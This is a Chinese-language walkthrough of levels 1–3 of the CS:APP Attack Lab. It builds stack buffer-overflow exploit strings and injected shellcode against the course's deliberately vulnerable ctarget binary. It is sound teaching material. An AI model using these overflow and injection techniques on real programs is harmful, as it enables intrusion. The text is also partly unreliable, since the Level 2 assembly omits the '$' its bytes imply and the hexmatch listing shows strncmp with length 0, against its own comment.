# Attack Lab

加深程序控制流的理解

## Using Hex2Raw

官方提供的小工具， 指导书后面的附录A里讲的很详细

作用是把16进制格式的“string”转成raw string. 也就是说把我们用"一个字节表示两个十六进制数"的形式表达的这么一块空间强行变成字符串形式以便于给后面的攻击程序做输入.

现在有ans.txt

```
30 31 32 33 34 35 00
./hex2raw < ans.txt
012345
```

## 得到指令的字节编码

比如我写一个`.s`文件

```
pushq   $0xabcdef
addq    $17,%rax
movl    %eax,%edx 
```

![img](https://mf3qv90vh2.feishu.cn/space/api/box/stream/download/asynccode/?code=YjE2ZmU5NzAwMGY0NDI5ZGY2YWJjZWJhNWMzMDcxNmNfSXhBY3lUbmc0NzRXM1JzVlhsN3B0VExaSFZTdDNwRE1fVG9rZW46Ym94Y25oMFhFTnZNajRuTDBzQzhaRUVjVHlkXzE2MzI0MDYwOTY6MTYzMjQwOTY5Nl9WNA)

在`test.d`里就能看到指令的字节集编码了

```
test.o:     file format pe-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:        68 ef cd ab 00               pushq  $0xabcdef
   5:        48 83 c0 11                  add    $0x11,%rax
   9:        89 c2                        mov    %eax,%edx
   b:        90                           nop
   c:        90                           nop
   d:        90                           nop
   e:        90                           nop
   f:        90                           nop
```

## Code Injection Attacks

### Level 1

直接告诉你调用过程了

```
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
touch1`的地址: `00000000004017c0
```

`getbuf`的过程

```
00000000004017a8 <getbuf>:
  4017a8:   48 83 ec 28             sub    $0x28,%rsp
  4017ac:   48 89 e7                mov    %rsp,%rdi
  4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:   b8 01 00 00 00          mov    $0x1,%eax
  4017b9:   48 83 c4 28             add    $0x28,%rsp
  4017bd:   c3                      retq   
  4017be:   90                      nop
  4017bf:   90                      nop
```

可以看到栈上是分配了0x28(即40字节)的空间, 我们只要在0x28后面的字符串中填入`touch1`的地址就行了. 注意x86是小段模式, 在内存中的分布情况要倒过来.最后要写入`touch1`的地址0x4017c0.

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00
```

注意x86是小端存储, 就是说对于一个数字比如0x12345678在内存中的存储方式是

```
78 56 34 12
```

![img](https://mf3qv90vh2.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTJjODY2NzY4ZjE4MDkxZWU5YmMyMmY2ZDZkMTVkMDJfMHp6YWlFR1Z6c3RTaUhsVjV5bkZ6YmtsOXhGajlQVUtfVG9rZW46Ym94Y25ubWVQUnRIM2VCeTJOd0o2ZFNrb3FkXzE2MzI0MDYwOTY6MTYzMjQwOTY5Nl9WNA)

### Level 2

让我们执行`touch2`

```
void touch2(unsigned val) {
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

问题在于`touch2`需要我们传入给定的cookie值才会正常运行, 所以我们需要想办法把函数参数传递进去. 解决方法是injected code, 把`rdi`设置成cookie值然后通过`ret`把控制权交给`touch2`.

写我们的汇编代码(`touch2`的地址为0x4017ec)

```
movq $0x59b997fa,%rdi
pushq 0x4017ec
ret
```

得到`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`. 那么如何让这段代码执行ne,简单的方式就是让`getbuf`执行完之后来到这些代码所在的位置.

查看栈的位置

```
(gdb) info r rsp
rsp            0x5561dc78       0x5561dc78
```

而`touch2`的地址为0x4017ec, 得到注入的内容

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

![img](https://mf3qv90vh2.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY1MmE1MmE3MTRhOWUzMGFmMDY1YWZlZTllMTM2ZjJfNmJ4THd0MFlCMVJObzBGYkw1TXF2U05STFFrWmhtUEVfVG9rZW46Ym94Y25HeEl1Q2ZxNUF6dTRNQW80S3pMSnpkXzE2MzI0MDYwOTY6MTYzMjQwOTY5Nl9WNA)

### Level 3

`ctarget`中有`hexmatch`和`touch3`(0x4018fa)

```
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 0) == 0; // 比较前9个字符
}

void touch3(char *sval)
 {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) { 
         printf("Touch3!: You called touch3(\"%s\")\n", sval);
         validate(3);
    } else {
         printf("Misfire: You called touch3(\"%s\")\n", sval);
         fail(3);
     }
    exit(0);
 }
```

显然是要求`touch3`的参数为字符串类型的`cookie`, 而且`hexmatch`里面的`s`的内存空间是随机的, 大概猜不到在哪里.

官方提示:

- 要在注入的string中包括cookie字符串
- 注入的代码要把`rdi`设置为cookie字符串的地址
- 调用hexmatch和strncmp时会覆盖`getbuf`分配的空间, 所以要小心

因此试图把string放在`test`的栈帧空间上

![img](https://mf3qv90vh2.feishu.cn/space/api/box/stream/download/asynccode/?code=MzhlYjI1OGIxZDY3MjY4MTM2OTM5ZTFmNzEyMjJlYzlfOVNOZFVWRlBYQ3ZWaDlxT2ljTTJFNVNqWjdnaHFVQzhfVG9rZW46Ym94Y25OdkY3SFJwYjJwWTljeHJuM2hha3NlXzE2MzI0MDYwOTY6MTYzMjQwOTY5Nl9WNA)

那么我们把对应的`string`放在0x5561dca8上

对应的汇编

```
movq $0x5561dca8,%rdi
pushq $0x4018fa
ret
```

得到的指令序列是`48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3`

构造攻击代码(cookie的ascii码是`35 39 62 39 39 37 66 61`

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

![img](https://mf3qv90vh2.feishu.cn/space/api/box/stream/download/asynccode/?code=OTZhMWIzNDdkNDBkMzM4M2RkNGE1ZDgyNzlmODA0MTlfWTVHb0pPMXlvZ24wdWdIVUwwS2h2QllNbXpDOUh6ZFZfVG9rZW46Ym94Y25XekU4VmdDdEZXVThpNVE4bDBMcVFmXzE2MzI0MDYwOTY6MTYzMjQwOTY5Nl9WNA)